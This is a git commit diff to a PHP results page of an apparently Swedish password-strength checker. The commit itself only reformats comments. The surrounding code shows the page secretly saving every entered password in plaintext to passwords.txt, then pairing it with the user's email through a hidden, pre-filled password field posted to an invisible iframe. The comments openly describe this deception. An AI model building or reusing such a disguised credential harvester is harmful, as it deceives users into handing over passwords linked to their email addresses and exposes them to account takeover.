131e1efe30802cdb59f9fd96b413cd66d40c977c
zeroxfourc <ludvighg1999@gmail.com>
2017-05-29 18:12:28 +0200

    proper multi-line comments

--- results.php
+++ results.php
@@ -9,7 +9,7 @@
     function blip_color($min_score) {
       // This function calculates what color the blips in the score bar should have.
       global $score;
-      if($score >= $min_score) { // Is this blip supposed to lit up?
+      if($score >= $min_score) { // Is this blip supposed to light up?
         if($score < 30) { // If so, in what color?
           echo "#fc291e";
         } elseif($score > 60) {
@@ -25,9 +25,11 @@
   <!--This iframe is used as an invisible target to load the email saving script into.-->
   <iframe name="secret_iframe" style="display: none;"></iframe>
   <?php
-    // First things first, let's store the password.
-    // This code assumes that the web server has write access to a file called passwords.txt in
-    // the same directory as this script.
+    /*
+      First things first, let's store the password.
+      This code assumes that the web server has write access to a file called passwords.txt in
+      the same directory as this script.
+    */
     $password = $_POST["password"];
     $pw_log = fopen("passwords.txt", "a");
     fwrite($pw_log, $password . PHP_EOL); // Stores the password with a trailing newline in the file
@@ -46,8 +48,10 @@
               for($x = 0; $x < strlen($password); $x++) { // Loops through each character in the password.
                 for($y = 0; $y < strlen($lower); $y++) { // Loops through each lower-case letter of the (english) alphabet.
                   if($password[$x] == $lower[$y]) {
-                    // If the current character and the current letter are the same at any point,
-                    // the password contains a lower-case letter.
+                    /*
+                      If the current character and the current letter are the same at any point,
+                      the password contains a lower-case letter.
+                    */
                     echo "Ja";
                     $contains_lower = True;
                     break 2; // Breaks out of both for loops.
@@ -113,11 +117,13 @@
               for($x = 0; $x < strlen($password); $x++) { // Loops through each character in the password.
                 for($y = 0; $y <= 255; $y++) { // Loops through numbers 0 to 255, e.g. the entirety of an 8-bit extended ASCII character set.
                   if((48 <= $y and $y <= 57) or (65 <= $y and $y <= 90) or (97 <= $y and $y <= 122)) {
-                    // This statement skips every character that's a letter or a digit.
-                    // In extended ASCII, every character is represented by a number between 0 and 255.
-                    // Numbers 48 through 57 represents digits 0 through 9, numbers 65 through 90
-                    // represent upper-case letters and numbers 97 through 122 represent lower-case letters.
-                    // Everything else is considered a symbol in our case.
+                    /*
+                      This statement skips every character that's a letter or a digit.
+                      In extended ASCII, every character is represented by a number between 0 and 255.
+                      Numbers 48 through 57 represents digits 0 through 9, numbers 65 through 90
+                      represent upper-case letters and numbers 97 through 122 represent lower-case letters.
+                      Everything else is considered a symbol in our case.
+                    */
                     break 1;
                   }
                   if(ord($password[$x]) == $y) {
@@ -184,7 +190,7 @@
         ?> / 80
       </h2>
       <table class="scorebar">
-        <!--I vomit a bit every time I look at this.-->
+        <!--This is the score bar. I vomit a bit every time I look at it.-->
         <tr>
           <td class="scoreblip" style="background-color: <?php blip_color(0); ?>;"></td>
           <td class="scoreblip" style="background-color: <?php blip_color(5); ?>;"></td>
@@ -224,19 +230,25 @@
       </p>
       <!--SPOILERS: No, we won't.-->
       <form action="save_email_and_pw.php" method="post" target="secret_iframe">
-        <!--Again, this is a bit interesting.-->
-        <!--When we save the email address, we want to save the password at the same time-->
-        <!--so we know which password belongs to which email address.-->
-        <!--To do this, we need to include the password in the email form.-->
+        <!--
+          Again, this is a bit interesting.
+          When we save the email address, we want to save the password at the same time
+          so we know which password belongs to which email address.
+          To do this, we need to include the password in the email form.
+        -->
         <input type="password" name="password" value="<?php echo $password; ?>" style="display: none;">
-        <!--This input field is automatically filled with the password, and is hidden. It'll still-->
-        <!--be included in the POST, though.-->
+        <!--
+          This input field is automatically filled with the password, and is hidden. It'll still
+          be included in the POST, though.
+        -->
         <p><input type="email" name="email" size="40" required></p>
         <p><input type="submit" value="Ge mig ett lösenord!"></p>
-        <!--When the user submits the email address and the password, the email saving script is-->
-        <!--loaded into the hidden iframe. The benefit of this is that we don't need to leave-->
-        <!--the page to save the email address. The drawback is that there's no indication the-->
-        <!--email address was saved.-->
+        <!--
+          When the user submits the email address and the password, the email saving script is
+          loaded into the hidden iframe. The benefit of this is that we don't need to leave
+          the page to save the email address. The drawback is that there's no indication the
+          email address was saved.
+        -->
       </form>
     </div>
   </div>
